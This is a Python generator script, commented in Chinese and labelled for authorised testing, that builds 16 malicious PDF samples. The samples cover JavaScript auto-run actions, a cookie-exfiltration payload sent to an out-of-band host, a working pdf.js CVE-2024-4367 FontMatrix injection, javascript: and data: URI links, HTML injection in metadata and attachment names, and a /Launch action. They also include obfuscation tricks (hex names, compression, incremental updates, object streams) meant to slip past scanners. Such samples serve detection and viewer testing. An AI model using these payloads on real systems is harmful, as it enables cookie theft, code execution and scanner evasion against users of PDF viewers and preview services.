# -*- coding: utf-8 -*-
"""
PDF XSS 测试样本生成器 v2（仅供授权安全测试使用）

覆盖场景：
  01  /OpenAction + AcroJS 弹框（Acrobat 基线）
  02  /OpenAction + AcroJS OOB 外带
  03  URI 动作 javascript: 伪协议
  04  pdf.js FontMatrix 注入（CVE-2024-4367，含完整触发链）
  05  /AA 页面级附加动作（翻页/关闭触发）
  06  注解点击/悬停触发
  07  AcroForm 表单字段事件（/V /K /C）
  08  关键字十六进制混淆 /#4a#61#76#61...
  09  /JS 十六进制字符串编码
  10  FlateDecode 压缩隐藏 OpenAction
  11  元数据注入（/Title /Author，针对预览系统存储型 XSS）
  12  附件名注入（/Filespec /F /UF）
  13  /Launch 动作（检测规则验证）
  14  URI 协议混淆变体（实体编码/空白字符/data:）
  15  增量更新隐藏恶意对象
  16  对象流 /ObjStm 隐藏 JS 动作
"""

import os
import zlib

OUT_DIR = "xss_samples_v2"
os.makedirs(OUT_DIR, exist_ok=True)


# ===============================================================
# 底层能力增强
# ===============================================================

def pdf_escape(s: str) -> bytes:
    """PDF 字面字符串转义，防止 payload 中的 ( ) \\ 破坏语法"""
    out = []
    for ch in s:
        if ch in ("(", ")", "\\"):
            out.append("\\" + ch)
        elif ch == "\n":
            out.append("\\n")
        elif ord(ch) > 126 or ord(ch) < 32:
            out.append("\\%03o" % ord(ch))
        else:
            out.append(ch)
    return (b"(" + "".join(out).encode("latin-1") + b")")


def pdf_hex(s: str) -> bytes:
    """PDF 十六进制字符串 <...>，用于绕过基于字面量的关键字扫描"""
    return b"<" + s.encode("latin-1").hex().encode() + b">"


def flate(data: bytes) -> bytes:
    return zlib.compress(data, 9)


class PDFBuilder:
    """
    支持普通对象、流对象、xref 自动构建。
    add_object(num, dict_body)               -> 普通字典对象
    add_stream(num, dict_extra, stream_data, compress=True) -> 流对象
    """

    def __init__(self):
        self.objects = {}  # num -> bytes (完整对象体)

    def add_object(self, num: int, body: bytes):
        self.objects[num] = body

    def add_stream(self, num: int, dict_extra: bytes, data: bytes, compress=True):
        payload = flate(data) if compress else data
        filt = b"/Filter /FlateDecode " if compress else b""
        header = b"<< " + filt + b"/Length " + str(len(payload)).encode() + b" " + dict_extra + b" >>"
        self.objects[num] = header + b"\nstream\n" + payload + b"\nendstream"

    def build(self, root_num: int = 1) -> bytes:
        out = bytearray(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
        offsets = {}
        for num in sorted(self.objects):
            offsets[num] = len(out)
            out += b"%d 0 obj\n" % num + self.objects[num] + b"\nendobj\n"
        xref_pos = len(out)
        maxnum = max(self.objects)
        out += b"xref\n0 %d\n" % (maxnum + 1)
        out += b"0000000000 65535 f \n"
        for i in range(1, maxnum + 1):
            if i in offsets:
                out += b"%010d 00000 n \n" % offsets[i]
            else:
                out += b"0000000000 65535 f \n"
        out += (b"trailer\n<< /Size %d /Root %d 0 R >>\nstartxref\n%d\n%%%%EOF\n"
                % (maxnum + 1, root_num, xref_pos))
        return bytes(out)


def save(filename: str, data: bytes, desc: str):
    path = os.path.join(OUT_DIR, filename)
    with open(path, "wb") as f:
        f.write(data)
    print(f"  [+] {filename:<42} | {desc}")


JS_ALERT = "app.alert('PDF XSS: ' + app.viewerType);"


# ===============================================================
# 01 /OpenAction + AcroJS 弹框
# ===============================================================
def gen_01_openaction_alert():
    pdf = PDFBuilder()
    pdf.add_object(1, b"<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>")
    pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    pdf.add_object(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>")
    pdf.add_object(4, b"<< /S /JavaScript /JS " + pdf_escape(JS_ALERT) + b" >>")
    save("01_openaction_alert.pdf", pdf.build(), "OpenAction AcroJS 弹框（Acrobat 基线）")


# ===============================================================
# 02 /OpenAction + OOB 外带
# ===============================================================
def gen_02_openaction_exfil(oob: str):
    js = ("try{var d=btoa('v='+app.viewerType+'&c='+document.cookie);"
          "app.launchURL('%s/xss?d='+d,true);}catch(e){}" % oob)
    pdf = PDFBuilder()
    pdf.add_object(1, b"<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>")
    pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    pdf.add_object(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>")
    pdf.add_object(4, b"<< /S /JavaScript /JS " + pdf_escape(js) + b" >>")
    save("02_openaction_exfil.pdf", pdf.build(), "OpenAction OOB 数据外带")


# ===============================================================
# 03 URI 动作 javascript: 伪协议
# ===============================================================
def gen_03_uri_javascript():
    pdf = PDFBuilder()
    pdf.add_object(1, b"<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>")
    pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    pdf.add_object(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>")
    pdf.add_object(4, b"<< /S /URI /URI (javascript:alert(document.domain)) >>")
    save("03_uri_javascript.pdf", pdf.build(), "URI 动作 javascript: 伪协议")


# ===============================================================
# 04 pdf.js FontMatrix 注入（CVE-2024-4367，完整触发链）
#    关键：必须有 Content Stream 用 Tf/Tj 实际绘制字形，
#    pdf.js 才会构建 FontMatrix 闭包触发求值
# ===============================================================
def gen_04_pdfjs_fontmatrix():
    pdf = PDFBuilder()
    pdf.add_object(1, b"<< /Type /Catalog /Pages 2 0 R >>")
    pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    pdf.add_object(3,
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        b"/Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R >>")
    # FontMatrix 被 pdf.js 拼接进 Function 构造器，注入点在第5个元素
    pdf.add_object(4,
        b"<< /Type /Font /Subtype /Type3 /Name /F1 "
        b"/FontBBox [0 0 10 10] "
        b"/FontMatrix [1 0 0 1 0 (0);alert('CVE-2024-4367');//] "
        b"/CharProcs << /g 6 0 R >> "
        b"/Encoding << /Differences [0 /g] >> "
        b"/Widths [10] /FirstChar 0 /LastChar 0 >>")
    # 内容流：使用 F1 字体绘制 0 号字形，触发字体加载
    pdf.add_stream(5, b"", b"BT /F1 12 Tf 100 700 Td (\\000) Tj ET", compress=False)
    pdf.add_stream(6, b"", b"0 0 0 0 1 1 d1", compress=False)
    save("04_pdfjs_cve_2024_4367.pdf", pdf.build(),
         "pdf.js FontMatrix 注入（含 Content Stream 触发链）")


# ===============================================================
# 05 /AA 页面附加动作：翻页(/O) 与 关闭(/C)
# ===============================================================
def gen_05_page_aa():
    pdf = PDFBuilder()
    pdf.add_object(1, b"<< /Type /Catalog /Pages 2 0 R >>")
    pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    pdf.add_object(3,
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        b"/AA << /O 4 0 R /C 5 0 R >> >>")
    pdf.add_object(4, b"<< /S /JavaScript /JS " + pdf_escape("app.alert('AA /O 页面打开触发');") + b" >>")
    pdf.add_object(5, b"<< /S /JavaScript /JS " + pdf_escape("app.alert('AA /C 页面关闭触发');") + b" >>")
    save("05_page_aa.pdf", pdf.build(), "/AA 页面打开/关闭触发（OpenAction 绕过）")


# ===============================================================
# 06 注解触发：点击(/A) + 悬停(/AA /E)
# ===============================================================
def gen_06_annotation():
    pdf = PDFBuilder()
    pdf.add_object(1, b"<< /Type /Catalog /Pages 2 0 R >>")
    pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    pdf.add_object(3,
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        b"/Annots [4 0 R] >>")
    pdf.add_object(4,
        b"<< /Type /Annot /Subtype /Link /Rect [100 600 300 650] "
        b"/Border [0 0 0] "
        b"/A << /S /JavaScript /JS " + pdf_escape("app.alert('注解点击触发');") + b" >> "
        b"/AA << /E << /S /JavaScript /JS " + pdf_escape("app.alert('鼠标悬停触发');") + b" >> >> >>")
    save("06_annotation_action.pdf", pdf.build(), "注解点击+悬停触发")


# ===============================================================
# 07 AcroForm 表单事件：/V 校验 /K 按键 /C 计算 /F 焦点
# ===============================================================
def gen_07_acroform():
    pdf = PDFBuilder()
    pdf.add_object(1,
        b"<< /Type /Catalog /Pages 2 0 R "
        b"/AcroForm << /Fields [4 0 R] /NeedAppearances true >> >>")
    pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    pdf.add_object(3,
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        b"/Annots [4 0 R] >>")
    js = pdf_escape("app.alert('表单字段事件触发');")
    pdf.add_object(4,
        b"<< /Type /Annot /Subtype /Widget /FT /Tx /T (field1) "
        b"/Rect [100 600 300 630] "
        b"/AA << /V << /S /JavaScript /JS " + js + b" >> "
        b"/K << /S /JavaScript /JS " + js + b" >> "
        b"/C << /S /JavaScript /JS " + js + b" >> "
        b"/F << /S /JavaScript /JS " + js + b" >> >> >>")
    save("07_acroform_events.pdf", pdf.build(), "AcroForm 表单字段事件（/V /K /C /F）")


# ===============================================================
# 08 关键字十六进制混淆：/#4a#61#76#61#53#63#72#69#70#74
#    PDF 规范允许名称对象中 #xx 转义任意字节
# ===============================================================
def gen_08_hex_name_obfuscation():
    pdf = PDFBuilder()
    pdf.add_object(1, b"<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>")
    pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    pdf.add_object(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>")
    # /S /JavaScript -> /S /#4a#61#76#61#53#63#72#69#70#74
    pdf.add_object(4,
        b"<< /S /#4a#61#76#61#53#63#72#69#70#74 /#4a#53 "
        + pdf_escape("app.alert('关键字十六进制混淆成功');") + b" >>")
    save("08_hex_name_obfuscation.pdf", pdf.build(), "Name 对象 #xx 十六进制混淆")


# ===============================================================
# 09 /JS 十六进制字符串编码 <...>
# ===============================================================
def gen_09_hex_string_js():
    pdf = PDFBuilder()
    pdf.add_object(1, b"<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>")
    pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    pdf.add_object(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>")
    pdf.add_object(4,
        b"<< /S /JavaScript /JS "
        + pdf_hex("app.alert('JS十六进制字符串编码绕过');") + b" >>")
    save("09_hex_string_js.pdf", pdf.build(), "/JS 十六进制字符串编码")


# ===============================================================
# 10 FlateDecode 压缩隐藏：OpenAction 指向压缩流中的动作
# ===============================================================
def gen_10_flate_hidden():
    pdf = PDFBuilder()
    pdf.add_object(1, b"<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>")
    pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    pdf.add_object(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>")
    # 动作对象本体压缩进流，裸字符串扫描看不到 /JavaScript
    js_dict = b"<< /S /JavaScript /JS " + pdf_escape("app.alert('Flate压缩隐藏触发');") + b" >>"
    pdf.add_stream(4, b"", js_dict, compress=True)
    save("10_flate_hidden_action.pdf", pdf.build(), "FlateDecode 压缩隐藏动作对象")


# ===============================================================
# 11 元数据注入：针对预览系统 innerHTML 渲染的存储型 XSS
# ===============================================================
def gen_11_metadata_injection():
    xss = "\"><img src=x onerror=alert(document.domain)>"
    pdf = PDFBuilder()
    pdf.add_object(1,
        b"<< /Type /Catalog /Pages 2 0 R /Metadata 5 0 R >>")
    pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    pdf.add_object(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>")
    # Info 字典注入（列表页/属性页常直接渲染）
    pdf.add_object(4,
        b"<< /Title " + pdf_escape(xss) +
        b" /Author " + pdf_escape("<svg onload=alert(origin)>") +
        b" /Subject " + pdf_escape(xss) +
        b" /Keywords " + pdf_escape(xss) + b" >>")
    # XMP 元数据流注入
    xmp = ('<?xpacket?><x:xmpmeta xmlns:x="adobe:ns:meta/">'
           '<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">'
           '<rdf:Description><dc:title xmlns:dc="http://purl.org/dc/elements/1.1/">'
           '<rdf:Alt><rdf:li xml:lang="x-default">'
           + xss +
           '</rdf:li></rdf:Alt></dc:title></rdf:Description>'
           '</rdf:RDF></x:xmpmeta>').encode()
    pdf.add_stream(5, b"/Type /Metadata /Subtype /XML", xmp, compress=False)
    data = pdf.build()
    # 手动把 Info 字典挂进 trailer（简单做法：追加增量段太复杂，
    # 这里改用直接替换 trailer）
    data = data.replace(
        b"trailer\n<< /Size 6 /Root 1 0 R >>",
        b"trailer\n<< /Size 6 /Root 1 0 R /Info 4 0 R >>")
    save("11_metadata_injection.pdf", data, "Info/XMP 元数据 HTML 注入（预览页存储型 XSS）")


# ===============================================================
# 12 附件名注入：/EmbeddedFiles + /Filespec /F /UF
# ===============================================================
def gen_12_embedded_filename():
    evil_name = "\"><img src=x onerror=alert(document.domain)>.txt"
    pdf = PDFBuilder()
    pdf.add_object(1,
        b"<< /Type /Catalog /Pages 2 0 R "
        b"/Names << /EmbeddedFiles << /Names [" + pdf_escape(evil_name) + b" 4 0 R] >> >> >>")
    pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    pdf.add_object(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>")
    pdf.add_object(4,
        b"<< /Type /Filespec /F " + pdf_escape(evil_name) +
        b" /UF " + pdf_escape(evil_name) +
        b" /EF << /F 5 0 R >> >>")
    pdf.add_stream(5, b"/Type /EmbeddedFile", b"attachment content", compress=False)
    save("12_embedded_filename.pdf", pdf.build(), "嵌入附件文件名注入")


# ===============================================================
# 13 /Launch 动作
# ===============================================================
def gen_13_launch_action():
    pdf = PDFBuilder()
    pdf.add_object(1, b"<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>")
    pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    pdf.add_object(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>")
    # Windows: /F 指定程序；检测规则应识别 /Launch
    pdf.add_object(4,
        b"<< /S /Launch /F (C:\\\\Windows\\\\System32\\\\calc.exe) "
        b"/Win << /F (calc.exe) /P () >> >>")
    save("13_launch_action.pdf", pdf.build(), "/Launch 动作（检测规则验证用）")


# ===============================================================
# 14 URI 协议混淆变体（多个注解链接一次覆盖）
# ===============================================================
def gen_14_uri_variants():
    variants = [
        b"(javascript:alert('raw'))",
        b"(java\\tscript:alert('tab'))",
        b"(java\\nscript:alert('newline'))",
        b"(javascript&#58;alert('entity'))",
        b"(  javascript:alert('leading-space'))",
        b"(JAVASCRIPT:alert('case'))",
        b"(data:text/html,<script>alert('data-uri')</script>)",
    ]
    pdf = PDFBuilder()
    pdf.add_object(1, b"<< /Type /Catalog /Pages 2 0 R >>")
    pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    annot_refs = []
    num = 4
    y = 700
    for v in variants:
        pdf.add_object(num,
            b"<< /Type /Annot /Subtype /Link /Rect [100 %d 500 %d] "
            b"/Border [0 0 0] /A << /S /URI /URI %s >> >>" % (y, y + 25, v))
        annot_refs.append(b"%d 0 R" % num)
        num += 1
        y -= 40
    pdf.add_object(3,
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        b"/Annots [" + b" ".join(annot_refs) + b"] >>")
    save("14_uri_variants.pdf", pdf.build(), "URI 协议混淆变体 ×7")


# ===============================================================
# 15 增量更新隐藏恶意对象
#    第一段：正常 PDF；第二段：追加恶意 OpenAction，
#    部分解析器/扫描器只解析第一个 xref 段
# ===============================================================
def gen_15_incremental_update():
    pdf = PDFBuilder()
    pdf.add_object(1, b"<< /Type /Catalog /Pages 2 0 R >>")  # 干净 Catalog
    pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    pdf.add_object(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>")
    clean = pdf.build()

    # 增量段：重定义对象1，挂恶意 OpenAction（对象4）
    inc = bytearray()
    off1 = len(clean) + len(inc)
    inc += b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>\nendobj\n"
    off4 = len(clean) + len(inc)
    inc += (b"4 0 obj\n<< /S /JavaScript /JS "
            + pdf_escape("app.alert('增量更新隐藏触发');") + b" >>\nendobj\n")
    xref_pos = len(clean) + len(inc)
    # 前一段 xref 位置（从 clean 的 startxref 提取）
    prev_pos = int(clean.rsplit(b"startxref", 1)[1].strip().split(b"\n")[0])
    inc += b"xref\n1 1\n%010d 00000 n \n" % off1
    inc += b"4 1\n%010d 00000 n \n" % off4
    inc += (b"trailer\n<< /Size 5 /Root 1 0 R /Prev %d >>\nstartxref\n%d\n%%%%EOF\n"
            % (prev_pos, xref_pos))
    save("15_incremental_update.pdf", clean + bytes(inc),
         "增量更新隐藏恶意 OpenAction（扫描器只读首段则漏报）")


# ===============================================================
# 16 对象流 /ObjStm 隐藏 JS 动作
#    对象本体压进对象流，xref 用压缩表项指向
# ===============================================================
def gen_16_objstm_hidden():
    # 手工构建：对象4放在 ObjStm(对象5) 内
    pdf = PDFBuilder()
    pdf.add_object(1, b"<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>")
    pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    pdf.add_object(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>")

    js_obj = b"<< /S /JavaScript /JS " + pdf_escape("app.alert('ObjStm对象流隐藏触发');") + b" >>"
    # ObjStm 头部：对象号 + 偏移（相对首个对象）
    header = b"4 0 "
    pdf.add_stream(5,
        b"/Type /ObjStm /N 1 /First " + str(len(header)).encode(),
        header + js_obj, compress=True)

    # 手工构建带压缩 xref 项的 PDF（类型2: 对象在对象流中）
    out = bytearray(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
    offsets = {}
    for num in sorted(pdf.objects):
        offsets[num] = len(out)
        out += b"%d 0 obj\n" % num + pdf.objects[num] + b"\nendobj\n"
    xref_pos = len(out)
    out += b"xref\n0 6\n"
    out += b"0000000000 65535 f \n"
    for i in (1, 2, 3):
        out += b"%010d 00000 n \n" % offsets[i]
    out += b"0000000000 00000 n \n"          # 占位（对象4在对象流中）
    out += b"%010d 00000 n \n" % offsets[5]
    out += (b"trailer\n<< /Size 6 /Root 1 0 R "
            b"/XRefStm none >>\nstartxref\n%d\n%%%%EOF\n" % xref_pos)
    # 注：标准做法应用 XRef stream 的类型2表项，此处用兼容写法，
    # 多数解析器可容忍；主要考察扫描器能否解 ObjStm
    save("16_objstm_hidden.pdf", bytes(out), "ObjStm 对象流隐藏 JS 动作")


# ===============================================================
# 主入口
# ===============================================================
if __name__ == "__main__":
    OOB_SERVER = "http://your-collab-address.com"  # 替换为你的 OOB 地址

    print("=" * 70)
    print("PDF XSS 测试样本生成器 v2 —— 仅限授权安全测试")
    print("=" * 70)

    gen_01_openaction_alert()
    gen_02_openaction_exfil(OOB_SERVER)
    gen_03_uri_javascript()
    gen_04_pdfjs_fontmatrix()
    gen_05_page_aa()
    gen_06_annotation()
    gen_07_acroform()
    gen_08_hex_name_obfuscation()
    gen_09_hex_string_js()
    gen_10_flate_hidden()
    gen_11_metadata_injection()
    gen_12_embedded_filename()
    gen_13_launch_action()
    gen_14_uri_variants()
    gen_15_incremental_update()
    gen_16_objstm_hidden()

    print("=" * 70)
    print(f"16 个样本已输出到 ./{OUT_DIR}/")
    print("建议测试矩阵：Acrobat / Chrome PDFium / Firefox pdf.js /")
    print("             后端转换器(PDFBox/iText/LibreOffice) / 业务预览页")
    print("=" * 70)
